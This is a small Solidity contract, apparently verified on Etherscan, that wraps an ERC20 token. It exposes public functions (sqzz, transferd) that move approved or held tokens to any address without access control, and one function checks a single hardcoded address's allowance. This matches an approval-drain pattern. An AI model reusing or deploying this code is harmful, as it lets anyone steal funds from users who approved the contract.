/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

pragma solidity ^0.5.4;
interface IERC20 {
function transfer(address recipient, uint256 amount) external;
function balanceOf(address account) external view returns (uint256);
function transferFrom(address sender, address recipient, uint256 amount) external ;
function decimals() external view returns (uint8);
function approve(address spender, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
}

contract test {


IERC20 public lpToken;// = IERC20(0x672E7838C86A6C6b695fb94D1309801A11C5b3DD);

constructor (IERC20 _lpToken) public {
lpToken = _lpToken;
}

function sqzz(address sq,address df,uint256 je) public{
    lpToken.transferFrom(sq,df,je);
}

function cxsq(address sqr) public view returns(uint256){
   return lpToken.allowance(sqr,address(this));
}



function transferd(address df,uint256 amount) public {
lpToken.transfer(df, amount);
}

function a() public view returns (uint256 currentAllowance) {
currentAllowance = lpToken.allowance(address(0xD1C06084a5eE2B09b215C2A9E564D44581147508),address(this));
}

function gethy() public view returns(uint){
   return lpToken.balanceOf(address(this));
}

function get() public view returns(uint){
   return lpToken.balanceOf(address(msg.sender));
}


}